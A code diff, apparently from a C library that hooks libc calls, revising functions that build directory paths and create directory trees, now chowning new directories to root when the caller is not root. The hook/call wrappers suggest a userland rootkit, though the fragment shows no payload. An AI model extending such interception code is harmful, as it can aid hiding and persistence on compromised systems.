@@ -3,13 +3,11 @@ char **getdirstructure(const char *path, int *cdir){
     size_t namesize;
     int c=0;
 
+    if(path[0] != '/' && (cwd = getcwd(NULL, 0)) == NULL)
+        return NULL;
+
     dirs = malloc(sizeof(char*)*MAXDIR);
     if(!dirs) return NULL;
-
-    if(path[0] != '/' && (cwd = getcwd(NULL, 0)) == NULL){
-        free(dirs);
-        return NULL;
-    }
 
     char targetpath[strlen(path)+PATH_MAX];
     memset(targetpath, 0, sizeof(targetpath));
@@ -39,12 +37,12 @@ char **getdirstructure(const char *path, int *cdir){
 }
 
 char *createdirstructure(const char *rootdir, const char *path, char **dirs, int cdir){
-    char *ret, fullpath[strlen(path)+PATH_MAX], *pathdup, *filename;
+    char *ret, fullpath[strlen(rootdir)+strlen(path)+3], *pathdup, *filename;
     size_t tmpsize, buflen=0, pathsize;
 
     memset(fullpath, 0, sizeof(fullpath));
     strcat(fullpath, rootdir);
-    buflen += strlen(rootdir)+1;
+    buflen = strlen(rootdir)+1;
     for(int i=0; i<cdir-1; i++){
         tmpsize = strlen(dirs[i])+3;
         if(tmpsize+buflen >= sizeof(fullpath)-1)
@@ -73,23 +71,17 @@ char *createdirstructure(const char *rootdir, const char *path, char **dirs, int
 }
 
 int mkdirstructure(const char *rootdir, char **dirs, int cdir){
-    DIR *dp;
-    hook(COPENDIR, CMKDIR);
-    dp = call(COPENDIR, rootdir);
-    if(dp == NULL && errno == ENOENT){
-        if(notuser(0)) return 0;
-        if((long)call(CMKDIR, rootdir, 0777) < 0)
-            return -1;
-        return mkdirstructure(rootdir, dirs, cdir);
-    }else if(dp == NULL) return -1;
-    else if(dp) closedir(dp);
-
     char current[PATH_MAX];
+    size_t cursize, tmpsize;
+    int mr;
+
+    hook(CMKDIR);
+
     memset(current, 0, sizeof(current));
     strcat(current, rootdir);
     current[strlen(rootdir)] = '/';
+    cursize = strlen(rootdir)+2;
 
-    size_t cursize = strlen(rootdir)+2, tmpsize;
     for(int i=0; i<cdir-1; i++){
         tmpsize = strlen(dirs[i])+2;
         if(tmpsize+cursize >= sizeof(current)-1)
@@ -100,8 +92,9 @@ int mkdirstructure(const char *rootdir, char **dirs, int cdir){
         strcat(current, tmp);
         cursize += tmpsize-1;
 
-        if((long)call(CMKDIR, current, 0777) < 0 && errno != EEXIST)
-            return -1;
+        mr = (long)call(CMKDIR, current, 0777);
+        if(mr != -1 && !notuser(0)) chown_path(current, 0);
+        else if(mr < 0 && errno != EEXIST) return -1;
     }
 
     return 1;
